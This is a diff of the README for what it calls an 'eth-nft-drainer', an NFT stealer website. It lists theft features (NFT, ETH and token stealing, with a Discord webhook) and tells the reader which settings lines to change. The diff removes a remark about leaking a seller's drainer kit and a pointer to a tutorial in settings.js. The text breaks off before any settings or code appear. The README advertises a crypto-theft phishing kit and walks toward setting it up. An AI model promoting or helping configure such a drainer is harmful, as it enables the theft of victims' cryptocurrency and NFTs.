@@ -1,18 +1,13 @@
 # eth-nft-drainer
 nft stealer website example
 
-Leaking this trash because the seller promises it to be "silent", when it's not and it requires 2x signatures. 1x signature for tokens to be sent, 1x signature for ETH/NFTS. ​​​​​​​
-
-
 Features:
 NFT Stealer
 ETH Stealer
 Token Stealer
 Discord Webhook
 
-Search for "TUTORIAL" in settings.js you will find all necessary info to change.
-
-Otherwise here are all the lines
+here are all the lines you need to change in
 
 Settings.js file -
 
